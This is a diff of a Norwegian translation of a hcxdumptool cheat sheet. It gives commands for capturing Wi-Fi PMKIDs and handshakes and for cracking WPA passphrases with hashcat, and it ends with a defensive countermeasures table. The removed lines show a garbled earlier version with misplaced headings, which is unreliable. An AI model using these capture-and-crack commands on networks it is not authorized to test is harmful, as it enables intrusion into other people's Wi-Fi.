@@ -1,38 +1,41 @@
-# 🔍 hcxdumptool – komplett hurtigreferanse
-
 <!-- language-home-navigation -->
-[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
 
-
-[hcxdumptool](https://github.com/ZerBea/hcxdumptool) is a modern, high-performance command-line Wi-Fi attack and packet capture tool. Unlike legacy Aircrack-ng tools, `hcxdumptool` captures WPA/WPA2/WPA3 PMKID (Pairwise Master Key Identifier) frames without requiring connected clients, captures EAPOL 4-way handshakes, and integrates directly with `hcxtools` for Hashcat cracking (mode 22000).
-
----
-
-## 📋 Innholdsfortegnelse
-
-- [[Hashcat Cracking (Mode 22000)](#hashcat-cracking-mode-22000)](#core-advantages--modern-architecture)
-- [Installasjon](#installation-hcxdumptool--hcxtools)
-- [Installasjon](#wireless-interface-setup)
-- [Before running `hcxdumptool`, terminate background network management services that interfere with raw packet injection:](#capturing-pmkid-clientless-attack)
-- [Converting Captures with `hcxpcapngtool`](#converting-captures-with-hcxpcapngtool)
-- [`-o hash.hc22000`: Output hash file in modern Hashcat format.](#hashcat-cracking-mode-22000)
-- [Filtering Channels and BSSIDs](#filtering-channels-and-bssids)
-- [Optimize capture speed by constraining scanning parameters:](#defensive-countermeasures--wpa3)
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)
 
 ---
 
-## [Hashcat Cracking (Mode 22000)](#hashcat-cracking-mode-22000)
 
-- **Clientless PMKID Attack**: Exploits the RSN IE (Robust Security Network Information Element) PMKID feature in modern routers. You do **not** need a connected client or deauthentication packets to capture the key material.
-- **Unified Hashcat Mode 22000**: Generates Hashcat-native hash files supporting both PMKID and full WPA-PBKDF2-PMK handshakes.
-- **Channel Hopping & Active Interrogation**: Transmits targeted association requests to elicit PMKIDs from listening APs.
+# hcxdumptool Jukseark
+
+[hcxdumptool](https://github.com/ZerBea/hcxdumptool) er et moderne, høyytelses kommandolinjeverktøy for Wi-Fi-angrep og pakkefangst. I motsetning til eldre Aircrack-ng-verktøy, fanger `hcxdumptool` WPA/WPA2/WPA3 PMKID (Pairwise Master Key Identifier)-rammer uten å kreve tilkoblede klienter, fanger EAPOL 4-veis håndtrykk og integreres direkte med `hcxtools` for Hashcat-cracking (modus 22000).
 
 ---
 
-## Installasjon
+## Innholdsfortegnelse
 
+- [Core Advantages & Modern Architecture](#core-advantages--modern-architecture)
+- [Installasjon (`hcxdumptool` & `hcxtools`)](#installation-hcxdumptool--hcxtools)
+- [Wireless Interface Setup](#wireless-interface-setup)
+- [Capturing PMKID (Clientless Attack)](#capturing-pmkid-clientless-attack)
+- [Konverter opptak med `hcxpcapngtool`](#converting-captures-with-hcxpcapngtool)
+- [Hashcat Cracking (Mode 22000)](#hashcat-cracking-mode-22000)
+- [Filtrering av kanaler og BSSID-er](#filtering-channels-and-bssids)
+- [Defensive mottiltak og WPA3](#defensive-mottiltak--wpa3)
+
+---
+
+## Kjernefordeler og moderne arkitektur
+
+- **Klientløst PMKID-angrep:** Utnytter RSN IE (Robust Security Network Information Element) PMKID-funksjonen i moderne rutere. Du trenger **ikke** en tilkoblet klient eller deautentiseringspakker for å fange opp nøkkelmaterialet.
+- **Unified Hashcat Mode 22000:** Genererer Hashcat-native hash-filer som støtter både PMKID og fulle WPA-PBKDF2-PMK-håndtrykk.
+- **Channel Hopping & Active Interrogation:** Sender målrettede tilknytningsforespørsler for å fremkalle PMKID-er fra lyttende AP-er.
+
+---
+
+## Installasjon (`hcxdumptool` & `hcxtools`)
 ```bash
 # Debian / Ubuntu / Kali Linux
 sudo apt-get update && sudo apt-get install -y hcxdumptool hcxtools
@@ -44,13 +47,11 @@ sudo pacman -S hcxdumptool hcxtools
 hcxdumptool --version
 hcxpcapngtool --version
 ```
-
 ---
 
-## Installasjon
+## Oppsett av trådløst grensesnitt
 
-Before running `hcxdumptool`, terminate background network management services that interfere with raw packet injection:
-
+Før du kjører `hcxdumptool`, må du avslutte bakgrunnsnettverksadministrasjonstjenester som forstyrrer råpakkeinjeksjon:
 ```bash
 # 1. Terminate interfering network services (NetworkManager, wpa_supplicant)
 sudo systemctl stop NetworkManager
@@ -64,87 +65,80 @@ sudo ip link set wlan0 up
 # 3. Verify monitor mode
 iw dev
 ```
-
 ---
 
-## Before running `hcxdumptool`, terminate background network management services that interfere with raw packet injection:
+## Fange PMKID (klientløst angrep)
 
-### 1. General PMKID Capture Across All 2.4GHz & 5GHz Channels
-Capture all nearby access points to a `.pcapng` file:
+### 1. Generell PMKID-opptak på tvers av alle 2,4 GHz- og 5GHz-kanaler
+Fang alle nærliggende tilgangspunkter til en `.pcapng`-fil:
 ```bash
 sudo hcxdumptool -i wlan0 -w capture.pcapng --rds=1
 ```
-- `-i wlan0`: Wireless monitor interface.
-- Capturing PMKID (Clientless Attack)
-- `--rds=1`: Transmit RTS frames to prompt AP responses.
+- `-i wlan0`: Trådløst skjermgrensesnitt.
+- `-w capture.pcapng`: Utdatafangstfil.
+- `--rds=1`: Send RTS-rammer for å spørre AP-svar.
 
-### Capture all nearby access points to a `.pcapng` file:
-Target only an authorized BSSID to prevent affecting unauthorized third-party routers:
+### 2. Fang et spesifikt måltilgangspunkt (BSSID-filter)
+Målrett kun en autorisert BSSID for å forhindre at uautoriserte tredjepartsrutere påvirkes:
 
-`-w capture.pcapng`: Output capture file.
+1. Opprett målfilterliste (`target_bssid.txt`):
 ```text
 001122334455
 ```
-*(BSSID without colons)*
+*(BSSID uten kolon)*
 
-Target only an authorized BSSID to prevent affecting unauthorized third-party routers:
+2. Kjør målrettet fangst:
 ```bash
 sudo hcxdumptool -i wlan0 -w target.pcapng --bpfp=target_bssid.txt -c 6
 ```
-- 1. Create target filter list (`target_bssid.txt`):
-- `--bpfp`: Apply BPF (Berkeley Packet Filter) list for target BSSIDs.
+- `-c 6`: Lås injeksjon og lytting til kanal 6.
+- `--bpfp`: Bruk BPF (Berkeley Packet Filter)-liste for mål-BSSID-er.
 
 ---
 
-## Converting Captures with `hcxpcapngtool`
+## Konvertering av opptak med `hcxpcapngtool`
 
-`--bpfp`: Apply BPF (Berkeley Packet Filter) list for target BSSIDs.
-
+Når PMKID-er eller EAPOL-rammer er samlet inn, konverter `.pcapng`-opptaket til et Hashcat-kompatibelt format:
 ```bash
 hcxpcapngtool -o hash.hc22000 -E essid_list.txt capture.pcapng
 ```
-- `-o hash.hc22000`: Output hash file in modern Hashcat format.
-- Converting Captures with `hcxpcapngtool`
-- The tool reports total PMKID and EAPOL frames extracted.
+- `-o hash.hc22000`: Utdata hash-fil i moderne Hashcat-format.
+- `-E essid_list.txt`: Lagre oppdagede nettverksnavn (ESSID-er) i en ordbok for målrettet passordknekking.
+- Verktøyet rapporterer totalt PMKID- og EAPOL-rammer som er hentet ut.
 
 ---
 
-## `-o hash.hc22000`: Output hash file in modern Hashcat format.
+## Hashcat Cracking (Modus 22000)
 
-The tool reports total PMKID and EAPOL frames extracted.
+Mode `22000` er Hashcats enhetlige WPA-PBKDF2-PMKID + EAPOL cracking-modus:
 
-### 1. Dictionary Attack
+### 1. Ordbokangrep
 ```bash
 hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
 ```
-
-### 2. Rule-Based Mutation Attack
+### 2. Regelbasert mutasjonsangrep
 ```bash
 hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
-
-### 1. Dictionary Attack
+### 3. Mask / Brute-Force Attack (8-sifrede numeriske passord)
 ```bash
 hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
 ```
-
 ---
 
-## Filtering Channels and BSSIDs
+## Filtrering av kanaler og BSSID-er
 
-Optimize capture speed by constraining scanning parameters:
-
+Optimaliser fangsthastigheten ved å begrense skanneparametere:
 ```bash
 # Scan only specific channels (e.g. 1, 6, 11)
 sudo hcxdumptool -i wlan0 -w filtered.pcapng -c 1,6,11
 ```
-
 ---
 
-## Optimize capture speed by constraining scanning parameters:
+## Defensive mottiltak og WPA3
 
-|Vulnerability|Attack Mechanism|Defense Recommendation|
+| Sårbarhet | Angrepsmekanisme | Forsvarets anbefaling |
 |---|---|---|
-|**PMKID Caching**|AP transmits PMKID in EAPOL frame 1 without client authentication|Disable 802.11r (Fast Transition / Roaming) if not needed; update router firmware.|
-|**Weak WPA2 Pre-Shared Key**|Offline PBKDF2 dictionary cracking (Hashcat mode 22000)|Enforce 16+ character random passphrases.|
-|**Legacy WPA2 Protocol**|Susceptible to PMKID and handshake capture|Upgrade to **WPA3-Personal (SAE)**; WPA3 uses Dragonfly handshake with forward secrecy, rendering captured frames uncrackable offline.|
+| **PMKID Caching** | AP overfører PMKID i EAPOL-ramme 1 uten klientautentisering | Deaktiver 802.11r (rask overgang / roaming) hvis det ikke er nødvendig; oppdater ruterens fastvare. |
+| **Svak WPA2 forhåndsdelt nøkkel** | Offline PBKDF2 ordbok cracking (Hashcat-modus 22000) | Håndhev 16+ tegn tilfeldige passordfraser. |
+| **Eldre WPA2-protokoll** | Mottakelig for PMKID og håndtrykkfangst | Oppgrader til **WPA3-Personal (SAE)**; WPA3 bruker Dragonfly-håndtrykk med fremadrettet hemmelighold, noe som gjør fangede bilder uslåelige offline. |
